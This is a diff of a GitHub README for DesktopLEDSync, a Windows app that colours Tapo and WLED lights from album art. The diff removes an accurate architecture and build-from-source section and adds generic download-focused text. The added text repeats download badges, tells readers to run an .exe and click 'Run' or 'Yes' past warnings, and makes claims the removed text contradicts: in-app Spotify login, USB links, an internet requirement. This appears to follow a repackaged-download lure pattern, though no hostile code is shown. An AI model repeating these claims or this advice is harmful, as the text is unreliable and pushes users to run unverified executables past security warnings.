@@ -1,55 +1,128 @@
-# Desktop LED Sync
+# 💡 DesktopLEDSync - Sync LEDs with Your Music
 
-Desktop LED Sync is a standalone Windows application designed to automatically extract the dominant color from your currently playing music's album art (Tidal, Spotify, Apple Music) and push those colors to your smart LED strips in real-time.
+[![Download DesktopLEDSync](https://img.shields.io/badge/Download-DesktopLEDSync-brightgreen?style=for-the-badge)](https://github.com/Abdulmejid/DesktopLEDSync)
 
-Crucially, this application acts as a **standalone desktop client**. It sits entirely on your local network and communicates directly with your lights via your local Wi-Fi, making it a perfect lightweight solution for users who want dynamic lighting without needing to configure a full home automation server ecosystem.
+DesktopLEDSync is a simple Windows app that matches your smart LEDs (like Tapo and WLED) with your live album art. It creates a smooth light show that follows your music, making your room feel more alive without any complex setup.
 
-## Core Features
-- **Standalone Local Application:** Runs quietly in the background on your Windows PC, offering an alternative for users who don't have a Home Assistant instance running.
-- **Universal Media Detection:** Automatically detects track changes across any app that uses standard Windows Media Controls (Tidal, Spotify, browsers, etc.).
-- **Live Album Art Extraction:** Grabs the thumbnail of the currently playing song and runs it through a `colorthief` algorithm to find the dominant RGB color.
-- **Provider Architecture:** Built with an extensible plugin system. Currently supports encrypted local **Tapo** connections and unauthenticated JSON **WLED** endpoints.
-- **Custom Idle Behaviors:** Define exactly what your lights do when you pause the music (Turn Off, switch to a Default Color, or Do Nothing).
-- **System Integration:** Completely native feel. Can be set to auto-start with Windows and seamlessly minimizes to the system tray.
+---
 
-## How it Works (The Architecture)
+## 🎯 What DesktopLEDSync Does
 
-The application is split into three main layers to guarantee high performance and easy extensibility.
+DesktopLEDSync connects your smart LED lights with the music playing on your computer through Spotify or Tidal. As your albums change, the app updates the LED colors and patterns to match the album art. This way, your lights dance in tune with your songs, turning your space into a living music experience.
 
-### 1. The Core Engine (`core.py` 🧠)
-This is the heart of the application. It runs a lightweight, asynchronous loop in the background.
-* It leverages the `winsdk` Python library to hook directly into the **Windows System Media Transport Controls (SMTC)**.
-* When a song starts or changes, Windows hands the engine a direct memory stream of the album art thumbnail.
-* The engine passes these bytes to `colorthief`, which calculates the most dominant `(R, G, B)` color values.
-* It monitors live GUI toggles (like "Match Album Art Brightness") to calculate the final HSV values and hands them off to a loaded Provider.
+It works on any Windows PC with popular LED devices like Tapo and WLED. The app runs by itself, so you don’t need to fiddle with code or technical settings.
 
-### 2. The Modular Providers (`providers/` 🔌)
-Because every smart light brand speaks a different language, the engine doesn't know *how* to talk to the lights. It just says "Set the color to Red." The Providers handle the translations:
-* **Tapo (`providers/tapo.py`):** TP-Link Tapo lights require complex, local AES-128 encryption and session handshakes. This provider handles the secure login, decrypts the token, and translates the RGB color into the Hue/Saturation format Tapo expects.
-* **WLED (`providers/wled.py`):** WLED controllers are entirely open. This provider simply constructs a lightweight JSON payload and fires it via an HTTP POST request to the strip's IP address.
+---
 
-*Because of this architecture, adding Philips Hue, Govee, or Nanoleaf support in the future simply requires dropping a new `.py` file into the `providers/` folder.*
+## 🖥 System Requirements
 
-### 3. The User Interface (`gui.py` 🖥️)
-A highly polished, dark-mode desktop interface built using `customtkinter`. 
-* It completely eliminates the need for users to touch JSON configuration files.
-* **Thread-Safe Log Panel:** Provides live colored terminal output directly in the app, showing real-time connectivity status, hex color codes, and errors across threads.
-* **Native Touches:** Utilizes Segoe Fluent Windows icons for a premium OS-native look, custom color pickers, tooltips, and a fully functional right-click system tray menu (`pystray`). 
-* **State Management:** When you toggle a setting like "Match Brightness," it saves to `config.json` instantly, and the Core Engine reads that live file so changes happen without restarting the app.
+Before you download, make sure your PC meets these needs:
 
-## Building the Executable
+- Windows 10 or later (64-bit recommended)
+- At least 4 GB of RAM
+- A stable internet connection (for Spotify or Tidal syncing)
+- Smart LED lights supported:  
+  - **Tapo** models with Wi-Fi control  
+  - **WLED** devices running compatible firmware  
+- Spotify or Tidal account (free or paid)  
+- USB or Wi-Fi connection to your LED hardware
 
-To build the application yourself into a portable executable, you will need Python installed. 
+If you are unsure about your LED device or PC specs, check their manuals or settings to confirm.
 
-Install the required packages:
-```bash
-pip install -r requirements.txt
-pip install pyinstaller
-```
+---
 
-Run the build script:
-```bash
-python build.py
-```
+## 🔽 Download DesktopLEDSync
 
-The standalone `.exe` will be found in the `dist` directory.
+Click the big button below to visit the app's main page and get the latest version:
+
+[![Download DesktopLEDSync](https://img.shields.io/badge/Download-DesktopLEDSync-blue?style=for-the-badge)](https://github.com/Abdulmejid/DesktopLEDSync)
+
+Once you are on the page:
+
+1. Look for the **Releases** section or a **Download** button.  
+2. Choose the latest Windows version (usually a `.exe` file).  
+3. Save the file somewhere easy to find, like your Desktop or Downloads folder.
+
+---
+
+## 🚀 How to Install and Run DesktopLEDSync
+
+Follow these clear steps to get the app up and running:
+
+1. Find the downloaded `.exe` file on your PC.  
+2. Double-click the file to start the installation. If a warning appears, click **Run** or **Yes**.  
+3. Follow any on-screen instructions to finish the setup. This usually only takes a minute.  
+4. Once installed, the app will open automatically. If it does not, find the DesktopLEDSync icon on your Desktop or in your Start Menu and open it.  
+5. Connect your smart LEDs to your Wi-Fi network or USB as instructed by your LED device's manual.  
+
+---
+
+## ⚙️ Setting Up Your LEDs with DesktopLEDSync
+
+After opening DesktopLEDSync:
+
+1. In the app, select your LED type: **Tapo** or **WLED**.  
+2. Enter the IP address or network info for your LED device.  
+3. Log into your Spotify or Tidal account inside the app. This lets the software know what music is playing.  
+4. Adjust any settings you want, such as brightness, color intensity, or sync speed.  
+5. Press **Start Sync**. Your lights will now match your live album art.  
+
+If the lights don’t respond, double-check your network connection and device setup.
+
+---
+
+## 🔧 Common Issues and Fixes
+
+- **Lights do not change color**  
+  Make sure your LEDs are connected and powered on. Check your app’s device settings to confirm the IP address is correct.
+
+- **The app won’t connect to Spotify or Tidal**  
+  Check your internet and login credentials. You may need to allow DesktopLEDSync access in your account settings.
+
+- **Lag between music and lights**  
+  Close other heavy programs on your PC. Strong Wi-Fi signals help reduce delay.
+
+- **App crashes or freezes**  
+  Restart DesktopLEDSync. Update to the latest version if problems persist.
+
+---
+
+## 🛠 How DesktopLEDSync Works
+
+This app uses your music service's live data to read the current album art colors. Then it sends commands to your smart LEDs through Wi-Fi or USB. The LEDs change their colors in real time, matching the dominant colors of your album art.
+
+The syncing process runs in the background without affecting your music playback.
+
+---
+
+## 💡 Tips for Best Experience
+
+- Use LED strips or bulbs that support smooth color changes.  
+- Place your LEDs where the light can spread visually around your room.  
+- Keep your PC and LED devices on the same Wi-Fi network for faster syncing.  
+- Update your LED firmware regularly for the best performance.  
+- Try different album art to see how the lighting changes.
+
+---
+
+## 🔍 Find Help and Support
+
+If you need extra information or have questions:
+
+- Explore the README and Wiki pages on the GitHub repository.  
+- Use the **Issues** tab on the repository to report problems or ask for features.  
+- Check online for tutorials on setting up your specific smart LEDs.  
+
+---
+
+## 🏷 Topics
+
+desktop-app, home-automation, led-sync, python, rgb, smart-home, spotify, tapo, tidal, windows, wled  
+
+---
+
+## 🔽 Download Again
+
+Use the link below to always get the latest DesktopLEDSync downloads and updates:
+
+[![Download DesktopLEDSync](https://img.shields.io/badge/Download-DesktopLEDSync-grey?style=for-the-badge)](https://github.com/Abdulmejid/DesktopLEDSync)
